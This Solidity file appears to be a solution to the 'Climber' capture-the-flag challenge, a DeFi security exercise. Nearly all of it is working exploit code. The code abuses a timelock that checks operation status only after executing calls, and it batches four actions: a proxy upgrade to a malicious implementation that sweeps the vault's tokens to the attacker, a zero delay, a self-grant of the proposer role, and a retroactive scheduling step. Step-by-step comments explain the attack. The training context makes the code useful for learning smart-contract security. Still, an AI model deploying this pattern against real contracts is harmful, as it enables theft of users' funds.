// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ClimberTimelock} from "../climber/ClimberTimelock.sol";
import {ClimberVault} from "../climber/ClimberVault.sol";
import {PROPOSER_ROLE} from "../climber/ClimberConstants.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {SafeTransferLib} from "solady/src/utils/SafeTransferLib.sol";

import "hardhat/console.sol";

contract ClimberVaultAttack is UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function stealFunds(address token, address recipient) external {
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract ClimberTimelockAttack {
    error ClimberAttack__ContractNotSweeper();

    ClimberTimelock private immutable i_timelock;
    ClimberVault private immutable i_vaultProxy;
    ClimberVaultAttack private immutable i_vaultAttackTemplate;
    address private immutable i_token;
    address private immutable i_owner;

    constructor(address _vaultProxy, address _token) {
        i_owner = msg.sender;
        i_token = _token;

        i_vaultProxy = ClimberVault(_vaultProxy);
        i_timelock = ClimberTimelock(payable(i_vaultProxy.owner()));
        i_vaultAttackTemplate = new ClimberVaultAttack();
    }

    modifier onlyProposer() {
        if (!i_timelock.hasRole(PROPOSER_ROLE, address(this))) {
            revert ClimberAttack__ContractNotSweeper();
        }
        _;
    }

    function launchAttack() external {
        /**
         * @notice The attack is only possible because ClimberTimelock::execute() only checks for the operation status after calling outside functions
         * ClimberTimelock::Execute() Attack:
         * Step 1. Upgrade ClimberVault implementation => Proxy will delegateCall ClimberVaultAttack::stealFunds() (ClimberVaultAttack is the new implementation and target of delegateCall)
         * Step 2. UpdateDelay to 0.
         * Step 3. Make ClimberTimelock grant proposer role to attacker
         * Step 4. Schedual operation (will not revert because delay == 0)
         */
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
            _getOperationParameters();

        i_timelock.execute(targets, values, dataElements, salt);
    }

    function schedualAttack() external onlyProposer {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
            _getOperationParameters();

        i_timelock.schedule(targets, values, dataElements, salt);
    }

    function _getOperationParameters()
        private
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt)
    {
        salt = bytes20(uint160(address(this)));
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);
        (targets[0], values[0], dataElements[0]) = _getStep1Parameters();
        (targets[1], values[1], dataElements[1]) = _getStep2Parameters();
        (targets[2], values[2], dataElements[2]) = _getStep3Parameters();
        (targets[3], values[3], dataElements[3]) = _getStep4Parameters();
    }

    /**
     * @notice Upgrade ClimberVault proxy implementation to ClimberVaultAttack and steal the proxy's funds (directly sent to the hacker's address)
     * @return target
     * @return value
     * @return data
     */
    function _getStep1Parameters() private view returns (address target, uint256 value, bytes memory data) {
        target = address(i_vaultProxy);
        value = 0;
        data = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(i_vaultAttackTemplate), // New implementation => Malicious vault template
            abi.encodeWithSignature("stealFunds(address,address)", i_token, i_owner) // steal the funds directly in 1 transaction => call the ClimberVaultAttack::stealFunds() function
        );
    }

    /**
     * @notice Sets the ClimberTimelock::delay to 0
     * @return target
     * @return value
     * @return data
     */
    function _getStep2Parameters() private view returns (address target, uint256 value, bytes memory data) {
        target = address(i_timelock);
        value = 0;
        data = abi.encodeWithSignature("updateDelay(uint64)", 0);
    }

    /**
     * @notice Register ClimberTimelockAttack contract as one of the Proposer Role in ClimberTimelock contract
     * @return target
     * @return value
     * @return data
     */
    function _getStep3Parameters() private view returns (address target, uint256 value, bytes memory data) {
        target = address(i_timelock);
        value = 0;
        data = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
    }

    /**
     * @notice Execute an operation to schedual the whole operation (upgrade ClimberVault implementation, delay to 0, grant proposer role to ClimberTimelockAttack, schedual the whole operation)
     * @return target
     * @return value
     * @return data
     */
    function _getStep4Parameters() private view returns (address target, uint256 value, bytes memory data) {
        target = address(this);
        value = 0;
        data = abi.encodeWithSignature("schedualAttack()");
    }
}
